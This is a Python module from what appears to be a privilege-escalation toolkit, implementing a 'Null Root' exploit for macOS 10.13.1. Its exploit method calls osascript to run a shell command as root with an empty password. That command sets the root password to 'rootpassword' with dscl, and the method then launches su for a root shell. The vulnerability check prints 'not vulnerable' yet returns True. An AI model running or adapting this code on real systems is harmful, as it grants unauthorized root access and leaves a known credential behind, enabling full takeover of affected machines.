import os
import subprocess
from subprocess import PIPE, Popen
from exploits.exploit import MacExploit
from src.kernels import KernelWindow
from constants import ARCHITECTURE_GENERIC, MAC_EXPLOIT_PATH, MAC_EXPLOIT_SOURCE_PATH, color_print, \
	HIGH_RELIABILITY, CONFIRMED_VULNERABLE, GENERIC_MAC

class NULLROOT(MacExploit):
	def __init__(self):
		super().__init__()
		self.name = "NULLROOT"
		self.formatted_name = "Null Root"
		self.type = "mac"
		self.brief_desc = "root without password and no root account = root"
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = [
			KernelWindow(GENERIC_MAC, CONFIRMED_VULNERABLE, 10, 13, 1, 10, 13, 1)
		]
		self.architecture = ARCHITECTURE_GENERIC
		self.source_c_path = os.path.join(MAC_EXPLOIT_PATH, "{}.c".format(self.name))
		self.compilation_path = os.path.join(MAC_EXPLOIT_SOURCE_PATH, self.name)
		self.exploit_command = "python {}.py".format(self.compilation_path)

	def determine_vulnerability(self):
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[-] system appears not to be vulnerable to {}".format(self.name), color="red")
		return True

	def exploit(self):
		"""
		We need to override base exploit because we're running a python script, not compiling C source
		"""
		perform_exploitation = str(
			input("Would you like to run exploit {} on this system? (y/n): ".format(self.name)))
		if "y" in perform_exploitation.lower():
			color_print("\t[*] performing exploitation of {}".format(self.name))
			color_print("\t[*] {}".format(self.exploit_command))
			try:

				create_root = ["/usr/bin/osascript", "-e",
							   'do shell script "dscl . -passwd /Users/root rootpassword" user name "root" password "" with administrator privileges']
				print("[*] creating root account")
				subprocess.call(create_root)
				print("[*] changing root account password to 'rootpassword'")
				subprocess.call(create_root)
				print("[*] getting a root shell for you (enter 'rootpassword' when prompted)")
				subprocess.call("su")
			except Exception as e:
				self.exploit_failure("exploitation interrupted")
				self.exploit_failure(e)
		else:
			self.exploit_failure("canceled execution of exploit {}".format(self.name))